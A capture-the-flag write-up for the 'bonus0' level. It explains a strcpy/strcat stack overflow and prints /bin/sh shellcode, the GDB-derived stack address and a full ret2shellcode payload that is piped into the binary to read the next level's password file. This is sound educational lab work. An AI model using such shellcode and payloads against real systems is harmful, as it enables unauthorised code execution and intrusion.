# Bonus0 — Stack Buffer Overflow (ret2shellcode)

## Overview

This level is a **classic stack buffer overflow** using `gets()`-like behavior.

* Two inputs are read
* Data is copied using unsafe functions (`strcpy`, `strcat`)
* We can overwrite the **return address**
* Goal: execute shellcode on the stack

---

## 1. Program Flow

```c
main()
 └── pp()
      ├── p(buf1)
      ├── p(buf2)
      ├── strcpy(dest, buf1)
      └── strcat(dest, buf2)
```

---

## 2. Vulnerability

Inside `pp()`:

```c
strcpy(dest, buf1);
strcat(dest, buf2);
```

* No bounds checking
* Both buffers are concatenated
* Can overflow the stack

---

## 3. Stack Layout

```text
[ buffer ]
[ saved EBP ]
[ return address ]
```

Overflow allows us to overwrite:

```text
return address → control EIP
```

---

## 4. Finding Stack Address

From GDB:

```bash
(gdb) b *p+28
(gdb) run
(gdb) x $ebp-0x1008
0xbfffe680
```

We choose an address inside our buffer:

```text
0xbfffe6d0
```

Little endian:

```text
\xd0\xe6\xff\xbf
```

---

## 5. Exploit Strategy

1. Put **NOP sled + shellcode** in first input
2. Overflow return address in second input
3. Redirect execution to stack

---

## 6. Shellcode

```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1
\x89\xc2\xb0\x0b\xcd\x80
```

---

## 7. Payload

```bash
(
python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"';
python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7';
cat
) | ./bonus0
```

---

## 8. Explanation

### First input

```text
NOP sled + shellcode
```

* `\x90` = NOP
* Increases success probability

---

### Second input

```text
AAAAAAA + return address + BBB
```

* `A * 9` → reach return address
* `\xd0\xe6\xff\xbf` → jump to shellcode
* `B * 7` → padding

---

## 9. Execution

Program flow:

1. Stack filled with shellcode
2. Return address overwritten
3. Function returns
4. Execution jumps to shellcode

---

## 10. Result

```bash
$ cat /home/user/bonus1/.pass
```

---

## 11. Key Takeaways

* `strcpy` / `strcat` are dangerous
* Stack overflow allows control of EIP
* NOP sled improves reliability
* Classic ret2shellcode technique

---
